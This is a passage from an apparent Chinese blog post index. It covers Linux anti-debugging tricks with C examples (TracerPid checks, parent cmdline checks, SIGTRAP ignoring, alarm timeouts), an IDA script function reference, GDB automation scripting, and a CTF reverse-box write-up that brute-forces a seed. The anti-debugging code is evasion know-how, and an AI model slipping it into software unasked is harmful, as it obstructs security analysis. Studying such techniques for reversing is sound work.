正常运行时为0，在有debugger挂载的情况下变为debugger的PID。因此通过不断读取这个值可以发现是否存在调试器，进行对应处理 例子如下 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/user.h&gt;#include &lt;string.h&gt;void test()&#123; FILE *fp; int TracerPid=0; fp=fopen(&quot;/proc/self/status&quot;,&quot;r&quot;); // printf(&quot;%p\\n&quot;,fp); static char buf[0x100]; char *ptr=&amp;buf; while(fgets(ptr, 0x100, fp)) &#123; if (strstr(ptr,&quot;TracerPid&quot;)) &#123; char tmp[0x10]; int len=strlen(ptr); TracerPid=atoi((char *)ptr+len-3); if (TracerPid != 0) &#123; puts(&quot;don&apos;t debug me!&quot;); &#125; &#125; &#125;&#125;int main(int argc, char const *argv[])&#123; while(1) &#123; test(); sleep(1); &#125;&#125; 类似的操作还有扫描整个虚拟地址空间，在text段查找被修改的字节码，如当调试器下断点的时候实际上会插入int3的字节码，从而达到断下的目的，如果扫描到这些特征字节码（如0xcc等等）就马上停止程序，从而达到反调试的作用，同样的比较容易被绕过，这里就只提供一种思路，不再举具体例子 2.检测/proc/self/cmdline 这种操作本质上就是在检测输入的命令内容，如果输入执行gdb ./xx或者strace ./xx就会被检测到 总体还是还是比较鸡肋的，如果先进gdb在attach pid的话就检测不到。。。 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) &#123; char buf1[0x20], buf2[0x100]; FILE* fp; snprintf(buf1, 24, &quot;/proc/%d/cmdline&quot;, getppid()); fp = fopen(buf1, &quot;r&quot;); fgets(buf2, 0x100, fp); fclose(fp); if(!strcmp(buf2, &quot;gdb&quot;) || !strcmp(buf2, &quot;strace&quot;)||!strcmp(buf2, &quot;ltrace&quot;)) &#123; printf(&quot;Debugger detected&quot;); return 1; &#125; printf(&quot;All good&quot;); return 0;&#125; 3.忽略int3异常信号 调试中最常见的操作便是下断点，而一般的下断点的方法就是在即将执行的指令前插入int3的字节码 (CC) ，在程序执行到int3时，就会触发 SIGTRAP 信号，而调试器就会接收到这些信号进行并对子进程进行处理，而如果子进程通过设置signal函数忽略SIGTRAP 信号，就可以使得断点无效，也就能达到反调试的作用 但是这个操作似乎只适用于反调试远古时期的gdb，现在的最新版本gdb基本上都防不住，仅提供一种思路 4.设置时间间隔 在程序启动时，通过alarm设置定时，到达时则中止程序 ，这样就不能长时间调试程序 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;void alarmHandler(int sig)&#123; printf(&quot;don&apos; t debug me&quot;); exit(1);&#125;void__attribute__((constructor))setupSig(void) &#123;//设置程序一开始就执行 signal(SIGALRM, alarmHandler); alarm(3);&#125;int main(int argc, char *argv[]) &#123; getchar(); puts(&quot;hello!&quot;); puts(&quot;hello!&quot;); puts(&quot;hello!&quot;); return 0;&#125; 当然还是比较容易绕过，方法很多很多 参考链接https://blog.toby.moe/linux-anti-debugging/ http://www.voidcn.com/article/p-hogkwhfh-ys.html https://blog.csdn.net/stonesharp/article/details/8211526 http://drops.xmd5.com/static/drops/mobile-16969.html","categories":[],"tags":[]},{"title":"IDA脚本笔记一","slug":"IDA╜┼▒╛▒╩╝╟╥╗","date":"2019-12-11T03:00:19.000Z","updated":"2019-12-11T19:01:04.000Z","comments":true,"path":"2019/12/10/IDA╜┼▒╛▒╩╝╟╥╗/","link":"","permalink":"http://yoursite.com/2019/12/10/IDA╜┼▒╛▒╩╝╟╥╗/","excerpt":"","text":"0x01 读取和修改数据的函数01 Byte1long Byte(long addr) 从虚拟地址addr处读取一个字节值 02 Word1long Word(long addr) 从虚拟地址addr处读取一个字（2字节）值 03 Dword1long Dword(long addr) 从虚拟地址addr处读取一个双字（4字节）值 04 PatByte1void PatchByte(long addr, long val) 设置虚拟地址addr处的一个字节值 05 PatchWord1void PatchWord(long addr, long val) 设置虚拟地址addr处的一个字值 06 PatchDword1void PatchDword(long addr,long val) 设置虚拟地址addr处的一个双字值 07 isLoaded1bool isLoaded(long addr) 如果addr包含有效数据，则返回1，否则返回0 0x02 用户交互函数01 Message1void Message(string format,...) 在输出窗口打印一条格式化消息。这个函数类似于C语言的printf函数，并接受printf风格的格式化字符串 02 print1void print(...) 在输出窗口中打印每个参数的字符串表示形式 03 Warning1void Warning(string format,...) 在对话框中显示一条格式化消息 04 AskStr1string AskFile(string default, string promat) 显示一个输入框，要求用户输入一个字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0 05 AskFile1string AskFile(long doSave, string mask, string promat) 显示一个文件选择对话框，以简化选择文件的任务。你可以创建新文件保存数据(doSave=1)，或选择现有的文件读取数据(doSave=0)。你可以根据mask(如*.或\\.idc)过滤显示的文件列表。如果操作成功，则返回选定文件的名称；如果对话框被取消，则返回0 06 AskYN1long AskYN(long default, string prompt) 用一个答案为“是”或“否”的问题提示用户，突出一个默认的答案（1为是，0为否，-1为取消）。返回值是一个表示选定答案的整数 07 ScreenEA1long ScreenEA() 返回当前光标所在位置的虚拟地址 08 Jump1bool Jump(long addr) 跳转到反汇编窗口的指定地址 0x03 字符串操纵函数01 form1string form(string format,...) 返回一个新字符串，该字符串根据所提供的格式化字符串和值进行格式化。这个函数基本上等同于C语言的sprintf函数 02 sprintf1string sprintf() 在IDA5.6中，sprintf用于替代form 03 atol1long atol(string val) 将十进制值val转换成对应的整数值 04 xtol1long xtol(string val) 将十六进制值val（可选择以0x开头）转换成对应的整数值 05 ltoa1string IItoa(long val, long radix) 一指定的radix（2、8、10或16）返回val的字符串值 06 ord1long ord(string ch) 返回单字符字符串ch的ASCII值 07 strlen1long strlen(string str) 返回所提供字符串的长度 08 strstr1long strstr(string str, string substr) 返回str中substr的索引。如果没有发现子字符串，则返回-1 09 substr1string substr(string str, long start, long end) 返回包含str中由start到end-1位置的字符的子字符串。如果使用分片，此函数等同于str[start:end] 0x04 文件输入/输出函数01 fopen1long fopen(string filename, string mode) 返回一个整数文件句柄（如果发生错误，则返回0），供所有IDC文件输入/输出函数使用。mode参数与C语言的fopen函数使用的模式（r表示读取，w表示写入，等等）类似 02 fclose1void fclose(long handle) 关闭fopen中文件句柄指定的文件 03 filelength1long filelength(long handle) 返回指定文件的长度，如果发生错误，则返回-1 04 fgetc1long fgetc(long handle) 从给定的文件中读取一个字节，如果发生错误，则返回-1 05 fputc1long fputc(long val, long handle) 写入一个字节到给定文件中。如果操作成功，则返回0；如果发生错误，则返回-1 06 fprintf1long fprintf(long handle, string format, ...) 将一个格式化字符串写入到给定文件中 07 writestr1long writestr(long handle, string str) 将指定的字符串写入到给定的文件中 08 readstr1string/long readstr(long handle) 从给定文件中读取一个字符串。这个函数读取到下一个换行符为止的字符串（包括非ASCII字符），包括换行符本身（ASCII 0xA）。如果操作成功，则返回字符串；如果读取到文件结尾，则返回-1 09 writelong1long writelong(long handle, long val, long bigendian) 使用大端(bigendian =1)或小端(bigendian =0)字节顺序将一个4字节整数写入到给定文件 10 readlong1long readlong(long handle, long bigendian) 使用大端(bigendian =1)或小端(bigendian =0)字节顺序从给定的文件中读取一个4字节整数 11 writeshort1long writeshort(long handle, long val, long bigendian) 使用大端(bigendian =1)或小端(bigendian =0)字节顺序将一个2字节整数写入到给定文件 12 readshort1long readshort(long handle, long bigendian) 使用大端(bigendian =1)或小端(bigendian =0)字节顺序从给定的文件中读取一个2字节整数 13 loadfile1bool loadfile(long handle, long pos, long addr, long length) 从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中 14 savefile1bool savefile(long handle, long pos, long addr, long length) 将以addr数据库地址开头的length数量的字节写入给定文件的pos位置 0x05 操纵数据库名称01 Name1string Name(long addr) 返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。如果名称被标记为局部名称，这个函数并不返沪用户定义的名称 02 NameEx1string NameEx(long from, long addr) 返回与addr有关的名称。如果该位置没有名称，则返回空字符串。如果from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称 03 MakeNameEx1bool MakeNameEx(long addr, string name, long flags) 将给定的名称分配给定的地址。该名称使用flags位掩码中指定的属性创建而成。这些标志在帮助系统中的MakeNameEx文档中有记载描述，可用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出 04 long LocByName1long LocByName(string name) 返回一个位置（名称已给定）的地址。如果数据库中没有这个名称，则返回BADADDR(-1) 05 long LocByNameEX1long LocByName(long funcaddr, string localname) 在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR(-1) 0x06 处理函数的函数01 GetFunctionAttr1long GetFunctionAttr(long addr, long attrib) 返回包含给定地址的函数的被请求的属性。请参考IDC帮助文档了解属性常量。例如，要查找一个函数的结束地址，可以使用GetFunctionAttr(addr, FUNCATTR_END) 02 GetFunctionName1string GetFunctionName(long addr) 返回包含给定地址的函数的名称。如果给定的地址并不属于一个函数，则返回一个空字符串 03 NextFunction1long NextFunction(long addr) 返回给定地址后的下一个函数的起始地址。如果数据库中给定地址后没有其他函数，则返回-1 04 PrevFunction1long PrevFunction(long addr) 返回给定地址之前距离最近的函数起始地址。如果在给定地址之前没有函数，则返回-1 05 long LocBy1long LocBy(string Name) 根据函数的名称，返回该函数的起始地址 0x07 代码交叉引用函数01 Rfirst1long Rfirst(long from) 返回给定地址向其转交控制权的第一个位置。如果给定的地址没有引用其他地址，则返回BADADDR(-1) 02 Rnext1long Rnext(long from, long current) 如果current已经在前一次调用Rfirst或Rnext时返回，则返回给定地址（from）转交控制权的下一个位置。如果没有其他交叉引用存在，BADADDR(-1) 03 XrefType1long XrefType() 返回一个常量，说明某个交叉引用查询函数（如Rfirst）返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN(近调用)、fl_CF(远调用)、fl_JN(近跳转)、fl_JF(远跳转)和fl_F(普通顺序流) 04 RfirstB1long RfirstB(long to) 返回转交控制权到给定地址的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR(-1) 05 RnextB1long RnextB(long to, long current) 如果current已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权到给定地址（to）的位置。如果不存在其他对给定位置的交叉引用，BADADDR(-1) 0x0801 Dfirst1long Dfirst(long from) 返回给定地址引用一个数据值的第一个位置。如果给定的地址没有引用其他地址，则返回BADADDR(-1) 02 Dnext1long Dnext(long from, long current) 如果current已经在前一次调用Dfirst或Dnext时返回，则返回给定地址（from）向其引用一个数据值的下一个位置。如果没有其他交叉引用存在，BADADDR(-1) 03 XrefType1long XrefType() 返回一个常量，说明某个交叉引用查询函数（如Dfirst）返回的最后一个交叉引用的类型。对于数据交叉引用，这些常量包括dr_0(提供的偏移量)、dr_W(数据写入)和dr_R(数据读取) 04 DfirstB1long DfirstB(long to) 返回给定地址作为数据引用的第一个位置。如果不存在对给定地址的交叉引用，则返回BADADDR(-1) 05 DnextB1long DnextB(long to, long current) 如果current已经在前一次调用DfirstB或DnextB时返回，则返回将给定地址（to）作为数据引用的下一次位置。如果没有其他交叉引用存在，BADADDR(-1) 0x09 数据库操纵函数01 MakeUnkn1void MakeUnkn(long addr, long flags) 取消位于指定地址的顶的定义。这里的表示（参见IDC的MakeUnkn文档）指出是否也取消随后的项的定义，以及是否删除任何与取消定义的项有关的名称。相关函数MakeUnknown允许你取消大块数据的定义 02 MakeCode1long MakeCode(long addr) 将位于指定地址的字节转换成一条指令。如果操作成功，则返回指令的长度，否则返回0 03 MakeByte1bool MakeByte(long addr) 将位于指定地址的项目转换成一个数据字节。类似的函数还包括MakeWord和MakeDword 04 MakeComm1bool MakeComm(long addr, string comment) 在给定的地址处添加一条常规注释 05 MakeFunction1bool MakeFunction(long begin, long end) 将由begin到end的指令转换成一个函数。如果end被指定为BADADDR(-1)，IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址 06 MakeStr1bool MakeStr(long begin, long end) 创建一个当前字符串(有GetStringType返回)类型的字符串，涵盖由begin到end-1之间的所有字节。如果end被指定为BADADDR(-1)，IDA会尝试自动确定字符串的结束位置 0x10 数据库搜索函数在IDA中Find系列函数中的flags参数是一个位掩码，可用于指定查找操作的行为。3个最为常用的标志分别为SEARCH_DOWN，它指示搜索操作扫描高位地址；SEARCH_NEXT，它略过当前匹配项，以搜索下一个匹配项；SEARCH_CASE，它以区分大小写的方式进行二进制和文本搜索 01 FindCode1long FindCode(long addr, long flags) 从给定的地址搜索一条指令 02 FindData1long FindData(long addr, long flags) 从给定的地址搜索一个数据项 03 FindBinary1long FindBinary(long addr, long flags, string binary) 从给定的地址搜索一个字节序列。字符binary指定一个十六进制字节序列值。如果没有设置SEARCH_CASE，且一个字节值指定了一个大写或小写ASCII字母，则搜索仍然会匹配对应的互补值。例如，”41 42”将匹配”61 62”和”61 42”，除非你设置了SEARCH_CASE标志位 04 FindText1long FindText(long addr, long flags, long row, long column, string text) 在给定的地址，从给定行（row）的给定列搜索字符串text。注意，某个给定地址的反汇编文本可能会跨越几行，因此，你需要指定搜索应从哪一行开始 0x11 反汇编行组件01 GetDisasm1string GetDisasm(long addr) 返回给定地址的反汇编文本。反回的文本包括任何注释，但不包括地址信息 02 GetMnem1string GetMnem(long addr) 返回位于给定地址的指令的助记符部分 03 GetOpnd1string GetOpnd(long addr, long opnm) 返回指定地址的指定操作数的文本形式。IDA以零为起始编号，从左向右对操作数编号 04 GetOpType1long GetOpType(long addr, long opnum) 返回一个整数，指出给定地址的给定操作数的类型。请参考IDC文档，了解操作数类型代码 05 GetOperandValue1long GetOperandValue(long addr, long opnum) 返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型 06 CommentEx1string CommentEx(long addr, long type) 返回给定地址处的注释文本。如果哦type为0，则返回常规注释的文本；如果type为1，则返回可重复注释的文本。如果给定地址处没有注释，则返回一个空字符串 脚本示例IDC脚本实现的功能是导出一段内存的数据为数组形式 12345678910111213141516auto str_addr,end_addr,dat;str_addr = 0x00413CD2;end_addr = 0x00413D1C;dat = end_addr - str_addr;auto i = 0;Message(\"[\");for(i=0;i&lt;dat;i++)&#123; if(i != dat-1) &#123; Message(\"%d ,\",Byte(str_addr+i)); &#125; else&#123; Message(\"%d\",Byte(str_addr+i)); &#125;&#125;Message(\"]\"); IDAPython脚本功能同上 123456789101112131415from idaapi import *data = []model = \"db\"str_addr = 0x00413CD2end_addr = 0x00413D1Cdat = end_addr - str_addri = 0for i in range(dat): if model == \"db\": data.append(Byte(str_addr + i)) if model == \"dw\": data.append(Word(str_addr + i)) if model == \"dd\": data.append(Dword(str_addr + i))print data","categories":[],"tags":[]},{"title":"GDB自动化脚本编写笔记一","slug":"GDB╫╘╢»╗»╜┼▒╛▒α╨┤▒╩╝╟╥╗","date":"2019-12-02T12:21:51.000Z","updated":"2019-12-03T04:22:04.000Z","comments":true,"path":"2019/12/02/GDB╫╘╢»╗»╜┼▒╛▒α╨┤▒╩╝╟╥╗/","link":"","permalink":"http://yoursite.com/2019/12/02/GDB╫╘╢»╗»╜┼▒╛▒α╨┤▒╩╝╟╥╗/","excerpt":"","text":"作为UNIX/Linux下使用广泛的调试器，gdb不仅提供了丰富的命令，还引入了对脚本的支持：一种是对已存在的脚本语言支持，比如python，用户可以直接书写python脚本，由gdb调用python解释器执行；另一种是命令脚本，用户可以在脚本中书写gdb已经提供的或者自定义的gdb命令，再由gdb执行 我们通常都是在交互模式下使用 GDB 的，即手动输入各种 GDB 命令。其实 GDB 也支持执行预先写好的调试脚本，进行自动化的调试。调试脚本由一系列的 GDB 命令组成，GDB 会顺序执行调试脚本中的命令 引子下面是一个带bug的二分查找实现： 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using std::cout;using std::endl;int binary_search(int *ary, unsigned int ceiling, int target)&#123; unsigned int floor = 0; while (ceiling &gt; floor) &#123; unsigned int pivot = (ceiling + floor) / 2; if (ary[pivot] &lt; target) floor = pivot + 1; else if (ary[pivot] &gt; target) ceiling = pivot - 1; else return pivot; &#125; return -1;&#125;int main()&#123; int a[] = &#123;1, 2, 4, 5, 6&#125;; cout &lt;&lt; binary_search(a, 5, 7) &lt;&lt; endl; // -1 cout &lt;&lt; binary_search(a, 5, 6) &lt;&lt; endl; // 4 cout &lt;&lt; binary_search(a, 5, 5) &lt;&lt; endl; // 期望3，实际运行结果是-1 return 0;&#125; 你打算调试下binary_search(a, 5, 5)这个组合。若如果用print大法，就在binary_search中插入几个print，运行后扫一眼，看看target=5的时候运行流是怎样的 debugger大法看似会复杂一点，如果在binary_search中插断点，那么前两次调用只能连按c跳过。其实没那么复杂，gdb允许用户设置条件断点。你可以这么设置： 1b binary_search if target == 5 现在就只有第三次调用会触发断点 问题看上去跟floor和ceiling值的变化有关。要想观察它们的值，可以p floor和p ceiling。不过有个简单的方法，你可以对它们设置watch断点：wa floor if target == 5。当floor的值变化时，就会触发断点 对于我们的示例程序来说，靠脑补也能算出这两个值的变化，专门设置断点似乎小题大做。不过在调试真正的程序时，watch断点非常实用，尤其当你对相关代码不熟悉时。使用watch断点可以更好地帮助你理解程序流程，有时甚至会有意外惊喜。另外结合debugger运行时修改值的能力，你可以在值变化的下一刻设置目标值，观察走不同路径会不会出现类似的问题。如果有需要的话，还可以给某个内存地址设断点：wa *0x7fffffffda40 除了watch之外，gdb还有一类catch断点，可以用来捕获异常/系统调用/信号。因为用途不大（我从没实际用过），就不介绍了，感兴趣的话在gdb里面help catch看看 commands编写调试脚本时必须要处理好断点的问题。在交互模式下，程序执行至脚本时，GDB 会等待用户输入下一步的命令。如何在脚本中定义断点触发时进行的操作？这需要一种类似回调函数的机制 GDB 中使用 Breakpoint Command Lists 的机制来实现这一点，可以给某个断点挂上待触发的命令。用户可以定义，当程序停在某个 breakpoint (或 watchpoint, catchpoint) 时，执行由 command-list 定义的一系列命令。其语法为： 123commands [list…]… command-list …end 例如，我想在每次进入 foo 函数且其参数 x &gt; 0 时打印 x 的值： 123456break foo if x&gt;0commandssilentprintf \"x is %d\\n\",xcontinueend 这里有几点要注意的： Breakpoint command list 中的第一个命令通常是 silent。这会让断点触发是打印的消息尽量精简。如果 command … end 中没有 printf 之类的打印语句，断点触发时甚至不会产生任何输出 Breakpoint command list 中的最后一个命令通常是 continue。这样程序不会在断点处停下，自动化调试脚本可以继续执行 GDB 运行自动化调试脚本的方式为： 1gdb [program] -batch -x [commands_file] &gt; log 其中 -batch 参数将 GDB 运行为脚本模式（不进入交互环境），-x 参数 (也可以写为 -command) 指定调试脚本文件 define举个例子，继续上面的二分查找操作b binary_search if target == 5之后，输入： 1234commi localsi argsend 按照之前的格式也可以是 1234567b binary_search if target == 5commandssilenti localsi argscontinueend 这样当上面的断点被触发时，i locals和i args命令会被触发，列出当前上下文内的变量。这个功能挺废的，因为你完全可以在断点被触发后才敲入这几个命令 要不是有define，commands就真成摆设了。接下来我们要介绍commands的好基友、最强大的gdb命令之一，define命令 一如unix世界里面的许多程序一样，gdb内部实现了一门DSL（领域特定语言）。用户可以通过这门DSL来编写自定义的宏，甚至编写调试用的自动化脚本。我们可以用define命令编写自定义的宏 继续上面的例子，你可以自定义一个命令代替b xxx comm ...： 123456789(gdb) define br_infoType commands for definition of \"br_info\".End with a line saying just \"end\".&gt;b $arg0&gt;comm&gt;i locals&gt;i args&gt;end(gdb) br_info binary_search if target == 5 当if target == 5条件满足时，br_info binary_search会被执行。br_info展开成为一系列命令，并用binary_search替换掉$arg0。一行顶过去五行 其实define也就是自定义命令，格式是： 1234define commandName statement ...... end 其中statement可以是任意gdb命令。此外自定义命令还支持最多10个输入参数：$arg0，$arg1 …… $arg9，并且还用$argc来标明一共传入了多少参数 则上面的命令可以写为脚本 12345678define br_info b $arg0 commands silent i locals i args continue end 除了在会话内创建自定义宏外，我们还可以用gdb的DSL编写宏文件，并导入到gdb中 举个有实际意义的例子。由于源代码的改变，我们需要更新断点的位置。通常的做法是删掉原来的断点，并新设一个。让我们现学现用，用宏把这两步合成一步： 1234567891011121314151617181920# gdb_macrodefine mv if $argc == 2 # argc即总参数个数 delete $arg0 # arg0即第一个参数 # 注意新创建的断点编号和被删除断点的编号不同 break $arg1 # arg1即第二个参数 else print \"输入参数数目不对，help mv以获得用法\" endend# (gdb) help mv 会输出以下帮助文档document mvMove breakpoint.Usage: mv old_breakpoint_num new_breakpointExample: (gdb) mv 1 binary_search -- move breakpoint 1 to `b binary_search`end# vi:set ft=gdb ts=4 sw=4 et 使用方法： 1234567891011(gdb) b binary_searchBreakpoint 1 at 0x40083b: file binary_search.cpp, line 7.(gdb) source ~/gdb_macro(gdb) help mvMove breakpoint.Usage: mv old_breakpoint_num new_breakpointExample: (gdb) mv 1 binary_search -- move breakpoint 1 to `b binary_search`(gdb) mv 1 binary_search.cpp:18Breakpoint 2 at 0x4008ab: file binary_search.cpp, line 18. 在gdb中执行脚本要使用source命令，例如：“source xxx.gdb” 还可以进一步，把source ~/gdb_macro也省掉。你可以创建gdb配置文件~/.gdbinit，让gdb启动时自动执行里面的指令。如果把自己常用的宏写在该文件中，就能直接在gdb里面使用了，用起来如内置命令一般顺滑 document除此以外，还可以为自定义命令写帮助文档，也就是执行help命令时打印出的信息： 123document myassign assign the second parameter value to the first parameterend 会话/历史/命令文件通常我们只有在程序出问题才会启动gdb，开始调试工作，调试完毕后退出。不过，让gdb一直开着未尝不是更好的做法。每个gdb老司机都懂得，gdb在r的时候会加载当前程序的最新版本。也即是说，就算不退出gdb，每次运行的也会是当前最新的版本。不退出当前调试会话有两个好处： 调试上下文可以得到保留。不用每次运行都重新设一轮断点 一旦core dump了，可以显示core dump的位置，无需带着core重新启动一次 在开发C/C++项目，我一般是这样的工作流程：一个窗口开着编辑器，编译也在这个窗口执行；另一个窗口开着gdb，这个窗口同时也用来运行程序。一旦要调试了（或者，又segment fault了），随手就可以开始干活 当然了，劳作一天之后，总需要关电脑回家。这时候只能退出gdb。不想明天一早再把断点设上一遍？gdb提供了保留断点的功能。输入save br .gdb_bp，gdb会把本次会话的断点存在.gdb_bp中。明天早上一回来，启动gdb的时候，加上-x .gdb_bp，让gdb把.gdb_bp当做命令文件逐条重新执行，一切又回到昨晚 调试脚本提到用-x指定命令文件来回放断点。那时的命令文件也算是一种用gdb的DSL编写的调试脚本。由于调试是件交互性的活，需要事先写好调试脚本的场景不多。即使如此，除了让gdb自动设置断点，依然有不少场景下可以用上调试脚本。其中之一，就是让gdb自动采集特定函数调用的上下文数据。我把这种方法称为“拖网法”，因为它就像拖网捕鱼一样，把逮到的东西都一股脑带上来 设想如下的情景：某个项目出现内存泄露的迹象。事先分配好的内存池用着用着就满了，一再地吞噬系统的内存。内存管理是自己实现的，所以无法用valgrind来分析。鉴于内存管理部分代码最近几个版本都没有改动过，猜测是业务逻辑代码里面有谁借了内存又不还。现在你需要把它揪出来。一个办法是给内存的分配和释放加上日志，再编译，然后重新运行程序，谋求复现内存泄露的场景。不过更快的办法是，敲上这一段代码： （假设分配内存的接口是my_malloc(char *p, size_t size)，释放内存的接口是free(char *p)） 12345678910111213141516171819# /tmp/malloc_free# 设置输出不要分屏set pagination offb my_malloccommsilentprintf &quot;malloc 0x%x %lu\\n&quot;, p, sizebtcendb my_freecommsilentprintf &quot;free 0x%x\\n&quot;, pbtcendc 直接让gdb执行它： 1sudo gdb -q -p $(pidof $your_project) -x /tmp/malloc_free &gt; log 运行一段时间后kill掉gdb，打开log看看里面的内容： 12345678910111213141516171819202122$ less logAttaching to process 8738Reading symbols from ...done.Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/x86_64-linux-gnu/libc-2.19.so...done.done.Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6......malloc 0x0 82#0 my_malloc (p=0x0, size=82) at memory.cpp:8#1 0x0000000000400657 in write_buffer (p=0x0, size=82) at memory.cpp:17#2 0x00000000004006b6 in main () at memory.cpp:25malloc 0x852c39c0 13#0 my_malloc (p=0x7ffd852c39c0 &quot;\\001&quot;, size=13) at memory.cpp:8#1 0x0000000000400657 in write_buffer (p=0x7ffd852c39c0 &quot;\\001&quot;, size=13) at memory.cpp:17#2 0x00000000004006b6 in main () at memory.cpp:25free 0x400780#0 my_free (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\\211\\377AVI\\211\\366AUI\\211\\325ATL\\215%x\\006 &quot;) at memory.cpp:14#1 0x0000000000400632 in read_buffer (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\\211\\377AVI\\211\\366AUI\\211\\325ATL\\215%x\\006 &quot;) at memory.cpp:16#2 0x00000000004006fe in main () at memory.cpp:28free 0x0...... 现在我们可以写个脚本对下帐。每次解析到malloc时，在对应指针的名下记下一项借出。解析到free时，表示销掉对应最近一次借出的还款。把全部输出解析完后，困扰已久的坏账情况就将水落石出，欠钱不还的老赖也将无可遁形。这种“拖网法”真的是简单粗暴又有效 我们还可以用这种“拖网法”获取指定函数的调用者比例、调用参数的分布范围等等。注意，不要在生产环境撒网，毕竟这么做对性能有显著影响。而且要做统计的话，也有更好的方法可以选 实战题目：reverse-box 来源：mma-ctf-2nd-2016 IDA分析代码 123456789101112131415161718int __cdecl main(int a1, char **a2) //a2即为二维数组&#123; size_t i; // [esp+18h] [ebp-10Ch] int v4; // [esp+1Ch] [ebp-108h] unsigned int v5; // [esp+11Ch] [ebp-8h] v5 = __readgsdword(0x14u); if ( a1 &lt;= 1 ) &#123; printf(\"usage: %s flag\\n\", *a2);//a2[0]存输入的数据 exit(1); &#125; sub_804858D(&amp;v4); for ( i = 0; i &lt; strlen(a2[1]); ++i ) printf(\"%02x\", *((unsigned __int8 *)&amp;v4 + a2[1][i])); putchar(10); return 0;&#125; 可以发现关键功能函数sub_804858D 123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl sub_804858D(_BYTE *a1)&#123; unsigned int v1; // eax int v2; // edx char v3; // al char v4; // ST1B_1 char v5; // al int result; // eax unsigned __int8 v7; // [esp+1Ah] [ebp-Eh] char v8; // [esp+1Bh] [ebp-Dh] char v9; // [esp+1Bh] [ebp-Dh] int v10; // [esp+1Ch] [ebp-Ch] v1 = time(0); srand(v1); do v10 = (unsigned __int8)rand(); while ( !v10 ); *a1 = v10; v7 = 1; v8 = 1; do &#123; v2 = v7 ^ 2 * v7; if ( (v7 &amp; 0x80u) == 0 ) v3 = 0; else v3 = 27; v7 = v2 ^ v3; v4 = 4 * (2 * v8 ^ v8) ^ 2 * v8 ^ v8; v9 = 16 * v4 ^ v4; if ( v9 &gt;= 0 ) v5 = 0; else v5 = 9; v8 = v9 ^ v5; result = (unsigned __int8)__ROR1__(v8, 4) ^ (unsigned __int8)__ROR1__(v8, 5) ^ (unsigned __int8)__ROR1__(v8, 6) ^ (unsigned __int8)__ROR1__(v8, 7) ^ (unsigned __int8)(v8 ^ *a1); a1[v7] = result; &#125; while ( v7 != 1 ); return result;&#125; 根绝srand、rand、time函数大概可以猜测即为生成一张随机数表，就可以使用GDB脚本爆出盒子 注意看此函数的汇编代码，在取随机数种子的位置： 123.text:080485A7 call _rand.text:080485AC and eax, 0FFh.text:080485B1 mov [ebp+var_C], eax 程序的流程很简单，就是先以时间做种子，取随机数生成一张表，然后输入作为表的索引，输出对应表中的十六进制数据 题目给出的目标输出为：95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a 实际上就是要求输入是多少 下面是GDB脚本 12345678910111213141516set $i=0set $total=256while($i&lt;$total) b *0x080485B1 #mov [ebp+var_C], eax 即程序取随机函数后的地址 方便修改种子数 b *0x8048704 #movzx eax, al，即程序最终结果的地址 run T #开始跑程序 set $eax=$i #使得种子数等于爆破值i set $i=$i+1 #i=i+1 continue #使得程序继续调试 if ($eax==0x95) #当等于正确答案时打印表 print $i, $i #打印出正确的种子数 x/256xb $esp+0x1c #打印盒子表 set $i=256 #使得i=256退出循环 end stopend 跑出来的结果 123456789101112131415161718192021222324252627282930313233$1 = 2150xffffcf6c: 0xd6 0xc9 0xc2 0xce 0x47 0xde 0xda 0x700xffffcf74: 0x85 0xb4 0xd2 0x9e 0x4b 0x62 0x1e 0xc30xffffcf7c: 0x7f 0x37 0x7c 0xc8 0x4f 0xec 0xf2 0x450xffffcf84: 0x18 0x61 0x17 0x1a 0x29 0x11 0xc7 0x750xffffcf8c: 0x02 0x48 0x26 0x93 0x83 0x8a 0x42 0x790xffffcf94: 0x81 0x10 0x50 0x44 0xc4 0x6d 0x84 0xa00xffffcf9c: 0xb1 0x72 0x96 0x76 0xad 0x23 0xb0 0x2f0xffffcfa4: 0xb2 0xa7 0x35 0x57 0x5e 0x92 0x07 0xc00xffffcfac: 0xbc 0x36 0x99 0xaf 0xae 0xdb 0xef 0x150xffffcfb4: 0xe7 0x8e 0x63 0x06 0x9c 0x56 0x9a 0x310xffffcfbc: 0xe6 0x64 0xb5 0x58 0x95 0x49 0x04 0xee0xffffcfc4: 0xdf 0x7e 0x0b 0x8c 0xff 0xf9 0xed 0x7a0xffffcfcc: 0x65 0x5a 0x1f 0x4e 0xf6 0xf8 0x86 0x300xffffcfd4: 0xf0 0x4c 0xb7 0xca 0xe5 0x89 0x2a 0x1d0xffffcfdc: 0xe4 0x16 0xf5 0x3a 0x27 0x28 0x8d 0x400xffffcfe4: 0x09 0x03 0x6f 0x94 0xa5 0x4a 0x46 0x670xffffcfec: 0x78 0xb9 0xa6 0x59 0xea 0x22 0xf1 0xa20xffffcff4: 0x71 0x12 0xcb 0x88 0xd1 0xe8 0xac 0xc60xffffcffc: 0xd5 0x34 0xfa 0x69 0x97 0x9f 0x25 0x3d0xffffd004: 